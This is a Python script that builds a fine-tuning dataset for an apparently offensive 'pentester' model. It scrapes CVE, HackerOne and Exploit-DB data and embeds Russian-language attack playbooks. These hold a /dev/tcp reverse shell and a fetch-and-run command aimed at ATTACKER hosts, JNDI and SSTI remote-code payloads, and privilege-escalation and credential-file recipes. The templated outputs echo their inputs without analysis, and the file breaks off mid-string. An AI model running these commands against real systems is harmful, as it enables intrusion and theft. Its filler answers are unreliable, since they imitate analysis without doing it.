"""
Hexor Dataset Builder — сбор данных для fine-tune модели пентестера
"""
import os
import json
import asyncio
import httpx
from pathlib import Path
from datetime import datetime

BASE = Path(__file__).parent.parent
RAW = BASE / "raw"
HACKERONE_DIR = BASE / "hackerone"
CVE_DIR = BASE / "cve"
EXPLOITDB_DIR = BASE / "exploitdb"
PROCESSED = BASE / "processed"


class DatasetBuilder:
    def __init__(self):
        for d in [RAW, HACKERONE_DIR, CVE_DIR, EXPLOITDB_DIR, PROCESSED]:
            d.mkdir(parents=True, exist_ok=True)

    async def collect_all(self):
        print("=" * 60)
        print("HEXOR DATASET BUILDER")
        print("=" * 60)

        # 1. NVD CVE data
        print("\n[1/3] Fetching CVE data from NVD...")
        cves = await self.fetch_cves()
        print(f"  -> {len(cves)} CVEs collected")

        # 2. HackerOne hacktivity
        print("\n[2/3] Fetching HackerOne hacktivity...")
        h1 = await self.fetch_hackerone()
        print(f"  -> {len(h1)} reports collected")

        # 3. Exploit-DB
        print("\n[3/3] Fetching Exploit-DB entries...")
        exploits = await self.fetch_exploitdb()
        print(f"  -> {len(exploits)} exploits collected")

        # Build training dataset
        print("\nBuilding training dataset...")
        dataset = self.build_training_data(cves, h1, exploits)
        self.save_dataset(dataset)

        print(f"\nDone! {len(dataset)} training samples saved to {PROCESSED}")
        return dataset

    # ── NVD CVE Fetcher ─────────────────────────────────────

    async def fetch_cves(self, pages: int = 20) -> list:
        all_cves = []
        start_index = 0
        page_size = 100

        async with httpx.AsyncClient(timeout=30) as client:
            for _ in range(pages):
                try:
                    r = await client.get(
                        "https://services.nvd.nist.gov/rest/json/cves/2.0",
                        params={
                            "startIndex": start_index,
                            "resultsPerPage": page_size,
                        },
                    )
                    r.raise_for_status()
                    data = r.json()

                    for item in data.get("vulnerabilities", []):
                        cve = item.get("cve", {})
                        all_cves.append(self._parse_cve(cve))

                    total = data.get("totalResults", 0)
                    start_index += page_size
                    if start_index >= total:
                        break

                    print(f"  Fetched {start_index}/{total} CVEs...")
                    await asyncio.sleep(1)  # Rate limit

                except Exception as e:
                    print(f"  Error fetching CVEs: {e}")
                    break

        # Save raw
        with open(RAW / "cve_raw.json", "w") as f:
            json.dump(all_cves, f, indent=2)

        return all_cves

    def _parse_cve(self, cve: dict) -> dict:
        metrics = cve.get("metrics", {})
        cvss_v3 = metrics.get("cvssMetricV31", [{}])[0].get("cvssData", {})
        cvss_v2 = metrics.get("cvssMetricV2", [{}])[0].get("cvssData", {})

        descriptions = cve.get("descriptions", [])
        desc_en = next((d["value"] for d in descriptions if d.get("lang") == "en"), "")

        weaknesses = cve.get("weaknesses", [])
        cwe = weaknesses[0].get("description", [{}])[0].get("value", "") if weaknesses else ""

        return {
            "id": cve.get("id"),
            "description": desc_en[:500],
            "cwe": cwe,
            "cvss_score": cvss_v3.get("baseScore") or cvss_v2.get("baseScore"),
            "severity": cvss_v3.get("baseSeverity") or cvss_v2.get("baseSeverity", ""),
            "attack_vector": cvss_v3.get("attackVector", ""),
            "published": cve.get("published", ""),
            "source": "NVD",
        }

    # ── HackerOne Fetcher ────────────────────────────────────

    async def fetch_hackerone(self) -> list:
        """
        Fetch from public HackerOne hacktivity.
        Note: some reports require auth. This fetches public-only.
        """
        reports = []

        async with httpx.AsyncClient(timeout=30) as client:
            # Try multiple pages
            for page in range(1, 21):
                try:
                    r = await client.get(
                        "https://hackerone.com/hacktivity",
                        params={"page": page, "query": "disclosed:true"},
                        headers={"Accept": "application/json"},
                    )
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            for item in data.get("reports", []):
                                report = item.get("report", item)
                                reports.append(self._parse_h1_report(report))
                        except json.JSONDecodeError:
                            # HTML response - try parsing
                            pass

                    await asyncio.sleep(1)
                except Exception as e:
                    print(f"  H1 page {page}: {e}")
                    break

        # Save
        with open(RAW / "hackerone_raw.json", "w") as f:
            json.dump(reports, f, indent=2)

        return reports

    def _parse_h1_report(self, report: dict) -> dict:
        return {
            "id": report.get("id", ""),
            "title": report.get("title", ""),
            "severity": report.get("severity_rating", ""),
            "vulnerability_type": report.get("weakness", {}).get("name", ""),
            "bounty": report.get("bounty_amount", ""),
            "disclosed": report.get("disclosed_at", ""),
            "summary": str(report.get("summary", ""))[:1000],
            "source": "HackerOne",
        }

    # ── Exploit-DB Fetcher ───────────────────────────────────

    async def fetch_exploitdb(self, limit: int = 500) -> list:
        exploits = []

        async with httpx.AsyncClient(timeout=30) as client:
            try:
                r = await client.get(
                    "https://gitlab.com/api/v4/projects/exploit-database%2Fexploitdb/repository/tree",
                    params={"per_page": limit, "recursive": False},
                )
                # Alternative: use exploit-db.com CSV
                r2 = await client.get(
                    "https://gitlab.com/exploit-database/exploitdb/-/raw/main/files_exploits.csv",
                    timeout=60,
                )
                if r2.status_code == 200:
                    lines = r2.text.strip().split("\n")[1:]  # Skip header
                    for line in lines[:limit]:
                        parts = line.split(",")
                        if len(parts) >= 5:
                            exploits.append({
                                "id": parts[0].strip(),
                                "file": parts[1].strip() if len(parts) > 1 else "",
                                "description": ",".join(parts[2:-3]).strip('"') if len(parts) > 5 else parts[2].strip(),
                                "date": parts[-3].strip() if len(parts) > 3 else "",
                                "author": parts[-2].strip() if len(parts) > 2 else "",
                                "type": parts[-1].strip() if len(parts) > 1 else "",
                                "source": "ExploitDB",
                            })
            except Exception as e:
                print(f"  ExploitDB error: {e}")

        with open(RAW / "exploitdb_raw.json", "w") as f:
            json.dump(exploits, f, indent=2)

        return exploits

    # ── Training Dataset Builder ──────────────────────────────

    def build_training_data(self, cves: list, h1: list, exploits: list) -> list:
        """
        Convert raw data into training format:
        Each sample: {"instruction": ..., "input": ..., "output": ...}
        """
        samples = []

        # CVE → "Analyze this vulnerability"
        for cve in cves:
            if cve.get("description"):
                samples.append({
                    "instruction": "Проанализируй эту уязвимость. Опиши: класс уязвимости, вектор атаки, потенциальное воздействие, и как её обнаружить при пентесте.",
                    "input": f"CVE: {cve.get('id', '')}\nSeverity: {cve.get('severity', '')}\nCVSS: {cve.get('cvss_score', '')}\nDescription: {cve.get('description', '')}",
                    "output": self._generate_cve_output(cve),
                })

        # HackerOne → "How to find this vuln"
        for report in h1:
            if report.get("title"):
                samples.append({
                    "instruction": "Как пентестеру найти эту уязвимость? Опиши методологию обнаружения и проверки.",
                    "input": f"Vulnerability: {report.get('title', '')}\nType: {report.get('vulnerability_type', '')}\nSeverity: {report.get('severity', '')}",
                    "output": self._generate_h1_output(report),
                })

        # ExploitDB → "Write exploit steps"
        for exploit in exploits:
            if exploit.get("description"):
                samples.append({
                    "instruction": "Опиши пошаговый процесс эксплуатации этой уязвимости. Какие инструменты использовать?",
                    "input": f"Exploit: {exploit.get('description', '')}\nType: {exploit.get('type', '')}\nPlatform: {exploit.get('platform', 'Linux')}",
                    "output": self._generate_exploit_output(exploit),
                })

        # Generic pentest reasoning samples
        samples.extend(self._generate_reasoning_samples())

        return samples

    def _generate_cve_output(self, cve: dict) -> str:
        sev = cve.get("severity", "MEDIUM")
        score = cve.get("cvss_score", "N/A")
        desc = cve.get("description", "")

        return (
            f"Класс уязвимости: {cve.get('cwe', 'Определяется по описанию')}\n"
            f"Severity: {sev} (CVSS {score})\n"
            f"Вектор атаки: {cve.get('attack_vector', 'NETWORK')}\n\n"
            f"Описание:\n{desc[:300]}\n\n"
            f"Методология обнаружения при пентесте:\n"
            f"1. Определить компонент/сервис из описания CVE\n"
            f"2. Проверить версию через баннеры/HTTP-заголовки (nmap -sV, whatweb)\n"
            f"3. Если версия уязвима — подтвердить через nuclei с шаблоном {cve.get('id', '')}\n"
            f"4. При отсутствии готового шаблона — написать кастомный PoC на основе описания CVE\n"
            f"5. Задокументировать evidence (скриншоты, вывод инструментов)\n\n"
            f"Рекомендация: обновить компонент до пропатченной версии."
        )

    def _generate_h1_output(self, report: dict) -> str:
        return (
            f"Методология обнаружения:\n"
            f"1. Изучить функционал приложения, связанный с {report.get('vulnerability_type', 'уязвимостью')}\n"
            f"2. Определить точки входа (API endpoints, параметры, формы)\n"
            f"3. Проверить обработку пользовательского ввода — отправить тестовые payload'ы\n"
            f"4. Проанализировать ответы сервера на признаки уязвимости\n"
            f"5. При обнаружении — написать PoC и зафиксировать evidence\n\n"
            f"Severity: {report.get('severity', 'N/A')}\n"
            f"Bounty: {report.get('bounty', 'N/A')}\n\n"
            f"Рекомендация: исправить логику обработки в соответствии с best practices."
        )

    def _generate_exploit_output(self, exploit: dict) -> str:
        return (
            f"Пошаговая эксплуатация:\n"
            f"1. Подготовка: определить целевую систему и версию ПО\n"
            f"2. Доставка payload: использовать вектор из описания — {exploit.get('type', 'remote/local')}\n"
            f"3. Триггер уязвимости: выполнить эксплойт согласно описанию\n"
            f"4. Верификация: подтвердить получение привилегий/доступа\n"
            f"5. Post-exploitation: закрепиться в системе, собрать данные\n\n"
            f"Инструменты: Metasploit, custom script, {exploit.get('type', '')}\n"
            f"Сложность: зависит от условий эксплуатации\n\n"
            f"Описание: {exploit.get('description', '')[:300]}"
        )

    def _generate_reasoning_samples(self) -> list:
        """Generate synthetic reasoning samples for pentesting thinking patterns."""
        patterns = [
            {
                "instruction": "Ты проводишь пентест веб-приложения. Обнаружен эндпоинт /api/users с параметром id. Какие уязвимости ты проверишь и в каком порядке?",
                "output": "Проверяю эндпоинт /api/users?id=X в следующем порядке:\n\n"
                          "1. IDOR (Insecure Direct Object Reference):\n"
                          "   - Меняю id на другие значения (1,2,3, admin, etc.)\n"
                          "   - Проверяю доступ к чужим данным без авторизации\n"
                          "   - Если нашел доступ к чужим данным → HIGH/CRITICAL\n\n"
                          "2. SQL Injection:\n"
                          "   - Пробую: id=1' / id=1\" / id=1 OR 1=1\n"
                          "   - Смотрю на ошибки в ответе\n"
                          "   - Если есть признаки — запускаю sqlmap\n\n"
                          "3. NoSQL Injection (если MongoDB):\n"
                          "   - id[$ne]=1 / id[$gt]=\n"
                          "   - Проверяю bypass авторизации\n\n"
                          "4. Mass Assignment:\n"
                          "   - Пробую добавить поля: role=admin, isAdmin=true\n"
                          "   - Проверяю меняются ли привилегии\n\n"
                          "5. Rate Limiting:\n"
                          "   - Шлю 100 запросов/сек — смотрю на 429/блокировку",
            },
            {
                "instruction": "При сканировании портов найден открытый порт 6379 (Redis) без пароля. Опиши свой план атаки.",
                "output": "Redis без пароля на порту 6379 — CRITICAL находка.\n\n"
                          "План атаки:\n"
                          "1. Проверка доступности:\n"
                          "   redis-cli -h TARGET ping\n"
                          "   Если PONG — Redis доступен без аутентификации\n\n"
                          "2. Сбор информации:\n"
                          "   INFO server — версия, аптайм\n"
                          "   CONFIG GET * — вся конфигурация\n"
                          "   DBSIZE — количество ключей\n"
                          "   KEYS * — все ключи (дорого, осторожно)\n\n"
                          "3. Эксплуатация через SSH key:\n"
                          "   ssh-keygen -t rsa -C 'attacker'\n"
                          "   (echo -e '\n'; cat id_rsa.pub; echo -e '\n') > key.txt\n"
                          "   cat key.txt | redis-cli -h TARGET -x set ssh_key\n"
                          "   redis-cli -h TARGET CONFIG SET dir /root/.ssh/\n"
                          "   redis-cli -h TARGET CONFIG SET dbfilename authorized_keys\n"
                          "   redis-cli -h TARGET SAVE\n"
                          "   ssh -i id_rsa root@TARGET  # RCE получен\n\n"
                          "4. Альтернатива — cron job:\n"
                          "   redis-cli -h TARGET set cron '\\n* * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"\\n'\n"
                          "   CONFIG SET dir /etc/cron.d/\n"
                          "   CONFIG SET dbfilename redis_exploit\n"
                          "   SAVE",
            },
            {
                "instruction": "Найден JWT токен. Опиши все возможные атаки на JWT.",
                "output": "Атаки на JWT токен:\n\n"
                          "1. None Algorithm Attack:\n"
                          "   - Меняю alg на 'none' в заголовке\n"
                          "   - Убираю подпись (оставляю точку)\n"
                          "   - Если сервер принимает — CRITICAL, можно подделать любой токен\n\n"
                          "2. HMAC/RSA Key Confusion:\n"
                          "   - Если сервер использует RS256, пробую HS256 с публичным ключом как секретом\n"
                          "   - Подписываю токен публичным ключом — сервер верифицирует\n\n"
                          "3. Weak Secret Brute Force:\n"
                          "   - Пробую jwt-cracker / hashcat на сигнатуру\n"
                          "   - Словари: rockyou, jwt-secrets\n"
                          "   - Если секрет 'secret', 'password', 'key' — взлом за секунды\n\n"
                          "4. Kid Header Injection:\n"
                          "   - kid = '../../../../etc/passwd' → LFI через kid\n"
                          "   - kid = 'aaa' | cat /dev/urandom | base64 → подпись предсказуема\n\n"
                          "5. Token Reuse / Missing Expiry:\n"
                          "   - Проверяю exp claim — если нет, токен вечный\n"
                          "   - Проверяю jti — можно ли replay\n\n"
                          "6. Sensitive Data in Payload:\n"
                          "   - Декодирую payload (base64)\n"
                          "   - Ищу: пароли, internal IDs, роли, ключи",
            },
            {
                "instruction": "Ты нашёл LFI (Local File Inclusion) через параметр page. Какие файлы ты попробуешь прочитать на Linux-сервере и почему?",
                "output": "LFI через page= — план чтения файлов по приоритету:\n\n"
                          "ПРИОРИТЕТ 1 — Креды и конфиги:\n"
                          "1. /etc/passwd — пользователи системы\n"
                          "2. /etc/shadow — хеши паролей (если права позволяют)\n"
                          "3. /home/USER/.ssh/id_rsa — SSH приватные ключи\n"
                          "4. .env — переменные окружения, API ключи, пароли БД\n"
                          "5. ../.env — если приложение в поддиректории\n"
                          "6. wp-config.php — если WordPress\n"
                          "7. config/database.yml — если Rails\n"
                          "8. .git/config — информация о репозитории\n\n"
                          "ПРИОРИТЕТ 2 — Исходный код:\n"
                          "9. index.php / app.py / server.js — логика приложения\n"
                          "10. /proc/self/environ — переменные окружения процесса\n"
                          "11. /proc/self/cmdline — команда запуска\n\n"
                          "ПРИОРИТЕТ 3 — Логи:\n"
                          "12. /var/log/apache2/access.log — RCE через log poisoning\n"
                          "13. /var/log/auth.log — попытки входа\n"
                          "14. /proc/self/fd/1,2,3 — файловые дескрипторы\n\n"
                          "ТЕХНИКИ BYPASS:\n"
                          "- /etc/passwd%00 — null byte (PHP < 5.3)\n"
                          "- ....//....//etc/passwd — path truncation\n"
                          "- php://filter/convert.base64-encode/resource=index.php — PHP filter chain\n"
                          "- expect://id — RCE через expect wrapper (редко)",
            },
            {
                "instruction": "При пентесте найден открытый SMB порт 445. Какие атаки ты проверишь?",
                "output": "SMB (порт 445) — план атаки:\n\n"
                          "1. Enumeration:\n"
                          "   enum4linux -a TARGET  # Полная инвентаризация\n"
                          "   smbclient -L //TARGET  # Список шар\n"
                          "   smbmap -H TARGET        # Доступные шары и права\n"
                          "   crackmapexec smb TARGET --shares  # Быстрый enum\n\n"
                          "2. Null Session / Guest Access:\n"
                          "   smbclient //TARGET/IPC$ -N  # Null session\n"
                          "   smbclient //TARGET/SHARE -N  # Гостевой доступ\n"
                          "   Если даёт доступ — собираю все файлы\n\n"
                          "3. Brute Force:\n"
                          "   crackmapexec smb TARGET -u users.txt -p passwords.txt\n"
                          "   hydra -L users -P pass TARGET smb\n\n"
                          "4. EternalBlue (MS17-010):\n"
                          "   nmap --script smb-vuln-ms17-010 TARGET\n"
                          "   Если уязвим — Metasploit: exploit/windows/smb/ms17_010_eternalblue\n"
                          "   RCE → SYSTEM privileges\n\n"
                          "5. SMB Signing Disabled:\n"
                          "   crackmapexec smb TARGET --gen-relay-list relay.txt\n"
                          "   ntlmrelayx.py -tf relay.txt -c 'command'\n"
                          "   Если signing off → NTLM relay → RCE\n\n"
                          "6. Known CVEs:\n"
                          "   CVE-2020-0796 (SMBGhost) — RCE на Windows 10\n"
                          "   CVE-2019-0708 (BlueKeep) — RCE на RDP, смежный вектор\n"
                          "   Проверяю через nuclei / metasploit",
            },
            {
                "instruction": "Ты нашёл SSRF через параметр url=. Опиши что можно сделать с SSRF и как развивать атаку.",
                "output": "SSRF через url= — план развития атаки:\n\n"
                          "ФАЗА 1 — Подтверждение:\n"
                          "1. url=http://ATTACKER_IP:8080/ — ловлю запрос на своём сервере\n"
                          "2. url=http://169.254.169.254/latest/meta-data/ — AWS metadata\n"
                          "3. url=http://127.0.0.1:80/ — internal services\n\n"
                          "ФАЗА 2 — Разведка внутренней сети:\n"
                          "4. Сканирую порты через SSRF: url=http://127.0.0.1:PORT/\n"
                          "   Порты: 22,80,443,3306,5432,6379,8080,9200,27017\n"
                          "   По времени ответа определяю открыт/закрыт\n"
                          "5. Читаю internal endpoints:\n"
                          "   /admin, /api/internal, /actuator, /metrics\n"
                          "6. Cloud metadata (по облаку):\n"
                          "   AWS: 169.254.169.254\n"
                          "   GCP: metadata.google.internal\n"
                          "   Azure: 169.254.169.254\n"
                          "   DigitalOcean: 169.254.169.254\n\n"
                          "ФАЗА 3 — Эксплуатация:\n"
                          "7. Если доступен Redis (6379) — RCE через SSRF (как выше)\n"
                          "8. Если Elasticsearch (9200) — читаю данные, могу выполнить Groovy script\n"
                          "9. Если внутренний API — выполняю действия от имени сервера\n"
                          "10. gopher:// для отправки произвольных TCP-пакетов через SSRF\n\n"
                          "ФАЗА 4 — Blind SSRF:\n"
                          "11. Если ответа нет — использую DNS callback (Burp Collaborator, interactsh)\n"
                          "12. Через тайминг определяю доступность хостов",
            },
            {
                "instruction": "При анализе JavaScript-файлов ты нашёл API-ключ. Какие проверки ты сделаешь чтобы подтвердить его валидность и критичность?",
                "output": "Найден API-ключ в JS — план валидации:\n\n"
                          "1. Определяю тип ключа:\n"
                          "   - AWS: AKIA...\n"
                          "   - Google: AIza...\n"
                          "   - Stripe: sk_live_... / pk_live_...\n"
                          "   - GitHub: ghp_... / github_pat_...\n"
                          "   - Slack: xoxb-...\n"
                          "   - Twilio: SK...\n"
                          "   - OpenAI: sk-...\n"
                          "   - Generic: выглядит как base64/hex\n\n"
                          "2. Проверяю валидность:\n"
                          "   AWS: aws sts get-caller-identity --access-key KEY --secret-key SECRET\n"
                          "   GitHub: curl -H 'Authorization: token KEY' https://api.github.com/user\n"
                          "   Slack: curl -H 'Authorization: Bearer TOKEN' https://slack.com/api/auth.test\n"
                          "   Stripe: curl https://api.stripe.com/v1/charges -u sk_live_KEY:\n"
                          "   Google: curl 'https://www.googleapis.com/...?key=KEY'\n\n"
                          "3. Определяю permissions/scope:\n"
                          "   AWS: iam-simulate-principal-policy / enumerate-iam\n"
                          "   GitHub: проверяю scopes через API /user\n"
                          "   Slack: проверяю доступные каналы, сообщения\n\n"
                          "4. Оцениваю критичность:\n"
                          "   Production vs test ключ\n"
                          "   Read-only vs read-write vs admin\n"
                          "   Scope доступа (весь AWS аккаунт? конкретный bucket?)\n\n"
                          "5. Документирую:\n"
                          "   Где найден ключ (файл, строка)\n"
                          "   Какие права у ключа\n"
                          "   Что можно сделать (exfiltrate данные, RCE через AWS, etc.)\n"
                          "   Severity: CRITICAL если production + admin права",
            },
            {
                "instruction": "Опиши как работает атака через HTTP Request Smuggling. Какие инструменты использовать для обнаружения?",
                "output": "HTTP Request Smuggling — план тестирования:\n\n"
                          "СУТЬ АТАКИ:\n"
                          "Расхождение в парсинге Content-Length vs Transfer-Encoding между\n"
                          "frontend (nginx, HAProxy) и backend (Gunicorn, uWSGI, Tomcat).\n"
                          "Атакующий отправляет один запрос, а backend видит два.\n\n"
                          "ТИПЫ SMUGGLING:\n"
                          "1. CL.TE — frontend: Content-Length, backend: Transfer-Encoding\n"
                          "2. TE.CL — frontend: Transfer-Encoding, backend: Content-Length\n"
                          "3. TE.TE — оба Transfer-Encoding, но по-разному обрабатывают obfuscation\n\n"
                          "ТЕСТИРОВАНИЕ:\n"
                          "1. Использую Burp Suite → HTTP Request Smuggler extension\n"
                          "2. Ручное тестирование через Turbo Intruder / smuggler.py\n"
                          "3. Проверяю time-based detection:\n"
                          "   POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nContent-Length: 4\\r\\n\\r\\n0\\r\\n\\r\\nX\n"
                          "   Если backend ждёт 'X' — CL.TE\n\n"
                          "ЭКСПЛУАТАЦИЯ:\n"
                          "1. Bypass frontend ACL — smuggled запрос обходит WAF\n"
                          "2. Cache poisoning — smuggled запрос кешируется, все юзеры получают poisoned response\n"
                          "3. Session hijacking — перехват запросов других пользователей\n"
                          "4. XSS через smuggled запрос с вредоносным телом",
            },
            {
                "instruction": "Ты тестируешь GraphQL API. Опиши методологию пентеста GraphQL эндпоинтов.",
                "output": "GraphQL пентест — методология:\n\n"
                          "1. Обнаружение:\n"
                          "   - /graphql, /gql, /api/graphql, /v1/graphql\n"
                          "   - Проверить GET /graphql?query={__typename}\n"
                          "   - GraphQL обычно возвращает 400 на некорректный запрос (а не 404)\n\n"
                          "2. Introspection (если не отключен):\n"
                          "   query { __schema { types { name fields { name type { name } } } } }\n"
                          "   Если работает — получаю ВСЮ схему: типы, поля, аргументы, мутации\n"
                          "   Инструменты: graphql-voyager, GraphQL IDE, Altair, Insomnia\n\n"
                          "3. Поиск уязвимых query/mutation:\n"
                          "   - Ищу: users, accounts, admin*, delete*, updatePassword\n"
                          "   - Проверяю аргументы на injection: id, search, filter, email\n"
                          "   - Мутации: createUser, updateUser, resetPassword\n\n"
                          "4. Injection через аргументы:\n"
                          "   query { user(id: \"1' OR 1=1--\") { name email } }  # SQLi\n"
                          "   query { search(query: \"<script>alert(1)</script>\") { results } }  # XSS\n"
                          "   query { user(id: 1) { password } }  # IDOR — если схема позволяет\n\n"
                          "5. Batching / DOS:\n"
                          "   Отправляю массив query в одном запросе — брутфорс/обход rate limit\n"
                          "   query { q1: user(id:1) { email } q2: user(id:2) { email } ... }\n"
                          "   Alias-based batching для bypass rate limiting\n\n"
                          "6. Глубина запроса:\n"
                          "   Проверяю максимальную глубину — могу ли сделать nested запрос\n"
                          "   query { users { posts { comments { author { posts { ... } } } } } }\n"
                          "   Если нет лимита — DOS через exponential growth\n\n"
                          "7. Инструменты:\n"
                          "   - Clairvoyance — получает схему без introspection\n"
                          "   - GraphQL Cop (Burp plugin)\n"
                          "   - InQL (Burp plugin)\n"
                          "   - BatchQL — анализ batching и introspection\n"
                          "   - GraphQLmap — автоматизация атак",
            },
            {
                "instruction": "Ты нашёл десериализацию Java-объектов. Как эксплуатировать insecure deserialization?",
                "output": "Insecure Deserialization (Java) — план эксплуатации:\n\n"
                          "ОПРЕДЕЛЕНИЕ:\n"
                          "1. Ищу признаки Java serialization:\n"
                          "   - Content-Type: application/x-java-serialized-object\n"
                          "   - Бинарные данные начинающиеся с 'aced0005' (hex)\n"
                          "   - Base64: rO0AB... (base64 от 'aced0005')\n"
                          "   - Параметры: data, payload, object, state, serialized\n\n"
                          "2. Определяю формат:\n"
                          "   - Java native serialization\n"
                          "   - JSON/XML (Jackson, XStream, Fastjson)\n"
                          "   - YAML (SnakeYAML)\n"
                          "   - AMF (Adobe)\n\n"
                          "ЭКСПЛУАТАЦИЯ:\n"
                          "3. ysoserial — основной инструмент:\n"
                          "   java -jar ysoserial.jar CommonsCollections1 'COMMAND' | base64\n"
                          "   Популярные gadget chains:\n"
                          "   - CommonsCollections 1-7\n"
                          "   - CommonsBeanutils1\n"
                          "   - Spring1, Spring2\n"
                          "   - Groovy1\n"
                          "   - Jdk7u21\n"
                          "   - URLDNS (для детекта, безвредный)\n\n"
                          "4. Для JSON deserialization:\n"
                          "   Jackson: [\"com.sun.rowset.JdbcRowSetImpl\", {\"dataSourceName\":\"ldap://ATTACKER:1389/Exploit\"}]\n"
                          "   Fastjson: {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://...\"}\n\n"
                          "5. JNDI Injection (если Java версия < 8u191):\n"
                          "   Запускаю LDAP сервер: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://ATTACKER/#Exploit\n"
                          "   Payload ссылается на мой LDAP → загружает и выполняет класс\n\n"
                          "6. Для слепой десериализации:\n"
                          "   - URLDNS gadget для DNS callback детекта\n"
                          "   - Time-based через sleep gadget chains\n"
                          "   - Error-based: разные gadget chains вызывают разные ошибки\n\n"
                          "7. Документирую:\n"
                          "   Какие gadget chains работают\n"
                          "   Версия Java / библиотек\n"
                          "   RCE получен? (да/нет)\n"
                          "   Severity: CRITICAL если RCE",
            },
            {
                "instruction": "Ты получил initial foothold на Linux-машине как www-data. Опиши свой план privilege escalation.",
                "output": "Linux Privilege Escalation (из www-data в root):\n\n"
                          "ФАЗА 1 — Быстрая разведка:\n"
                          "1. whoami && id && uname -a\n"
                          "2. sudo -l  # Могу ли sudo что-то?\n"
                          "3. find / -perm -4000 -type f 2>/dev/null  # SUID binaries\n"
                          "4. getcap -r / 2>/dev/null  # Capabilities\n"
                          "5. crontab -l && ls -la /etc/cron*  # Cron jobs\n"
                          "6. ps aux | grep root  # Процессы от root\n"
                          "7. ss -tlnp  # Слушающие порты (internal services)\n\n"
                          "ФАЗА 2 — LinPEAS:\n"
                          "8. Загружаю и запускаю linpeas.sh\n"
                          "   curl ATTACKER/linpeas.sh | sh\n"
                          "   Анализирую вывод: красные/жёлтые находки\n\n"
                          "ФАЗА 3 — Основные векторы:\n"
                          "9. SUID exploitation:\n"
                          "   - /usr/bin/find → find . -exec /bin/sh \\; -quit\n"
                          "   - /usr/bin/vim → vim -c ':!sh'\n"
                          "   - /usr/bin/python → python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n"
                          "   - Проверяю GTFOBins для каждого SUID\n\n"
                          "10. Sudo rights:\n"
                          "    sudo -l показывает (ALL) NOPASSWD: /usr/bin/something\n"
                          "    → GTFOBins для этого something\n\n"
                          "11. Writable /etc/passwd:\n"
                          "    openssl passwd -1 password123\n"
                          "    echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd\n"
                          "    su newroot\n\n"
                          "12. Docker group:\n"
                          "    docker run -v /:/mnt -it alpine chroot /mnt sh\n\n"
                          "13. Capabilities:\n"
                          "    cap_setuid+ep → Python: os.setuid(0)\n"
                          "    cap_sys_ptrace → inject shellcode в root процесс\n\n"
                          "14. Kernel exploits:\n"
                          "    uname -a → ищу exploit для этой версии\n"
                          "    DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847)\n"
                          "    PwnKit (CVE-2021-4034) — pkexec\n\n"
                          "ФАЗА 4 — Нестандартные векторы:\n"
                          "15. Credentials в файлах: .env, config.php, wp-config.php, .git\n"
                          "16. Internal services: MySQL с root без пароля, Redis\n"
                          "17. NFS: showmount -e → mount и suid файлы\n"
                          "18. Wildcard injection: tar, rsync, chown в cron'ах",
            },
            {
                "instruction": "Ты пентестишь мобильное приложение (Android). Опиши свою методологию.",
                "output": "Android пентест — методология:\n\n"
                          "1. Декомпиляция:\n"
                          "   - apktool d app.apk  # Декомпиляция в smali\n"
                          "   - jadx-gui app.apk   # Декомпиляция в Java\n"
                          "   - Анализирую AndroidManifest.xml\n\n"
                          "2. Анализ конфигурации (AndroidManifest.xml):\n"
                          "   - android:debuggable=true  # Дебаг режим\n"
                          "   - android:allowBackup=true  # Можно снять backup данных\n"
                          "   - android:usesCleartextTraffic=true  # HTTP трафик\n"
                          "   - exported activities/services/receivers\n"
                          "   - permissions: READ_CONTACTS, LOCATION, CAMERA — избыточные?\n\n"
                          "3. Hardcoded secrets:\n"
                          "   grep -r 'API_KEY\\|SECRET\\|password\\|token\\|private' jadx_output/\n"
                          "   Ищу: API ключи, пароли, токены, сертификаты\n"
                          "   strings app.apk | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$'  # base64\n\n"
                          "4. Network security:\n"
                          "   - Certificate Pinning? Обхожу через Frida/Objection\n"
                          "   - Burp Suite как прокси\n"
                          "   - Анализирую API запросы (REST, GraphQL, WebSocket)\n"
                          "   - Ищу: IDOR, SQLi, auth bypass в API\n\n"
                          "5. Local storage:\n"
                          "   - SharedPreferences — часто хранят токены в plaintext\n"
                          "   - SQLite базы — пароли, PII\n"
                          "   - Internal storage files\n"
                          "   - Firebase DB — проверяю правила доступа\n\n"
                          "6. Runtime manipulation:\n"
                          "   - Frida: обхожу root detection, SSL pinning\n"
                          "   - Objection: автоматизация mobile pentest\n"
                          "   - Xposed: модификация поведения приложения\n"
                          "   - Magisk: root доступ\n\n"
                          "7. Deep links / Intent hijacking:\n"
                          "   adb shell am start -d 'appscheme://...'\n"
                          "   Проверяю обработку параметров в deeplink'ах\n"
                          "   Intent redirection / hijacking\n\n"
                          "8. WebView:\n"
                          "   - setJavaScriptEnabled(true) + loadUrl(userInput) → XSS → доступ к Java методам\n"
                          "   - addJavascriptInterface → RCE через WebView\n\n"
                          "9. Инструменты:\n"
                          "   - MobSF (Mobile Security Framework) — автоматический анализ\n"
                          "   - Frida + Objection — runtime\n"
                          "   - Burp Suite — трафик\n"
                          "   - jadx + apktool — статика\n"
                          "   - Drozer — Android security framework",
            },
            {
                "instruction": "Ты нашёл SSTI (Server-Side Template Injection) в Jinja2. Как подтвердить и эксплуатировать?",
                "output": "SSTI в Jinja2 (Python) — эксплуатация:\n\n"
                          "ДЕТЕКТ:\n"
                          "1. {{7*7}} → если вывод '49' → SSTI подтверждён\n"
                          "2. {{config}} → вывод конфига Flask\n"
                          "3. {{''.__class__}} → <class 'str'>\n\n"
                          "SMARTY (PHP):\n"
                          "4. {7*7} → 49\n"
                          "5. {system('id')} → вывод команды\n\n"
                          "FREEMARKER (Java):\n"
                          "6. ${7*7} → 49\n"
                          "7. <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}\n\n"
                          "VELOCITY (Java):\n"
                          "8. #set($x=7*7)$x → 49\n\n"
                          "JINJA2 RCE:\n"
                          "9. Базовый RCE:\n"
                          "   {{ ''.__class__.__mro__[1].__subclasses__() }}\n"
                          "   Ищу subprocess.Popen в списке\n"
                          "   {{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate() }}\n\n"
                          "10. Более простой RCE (если доступен os):\n"
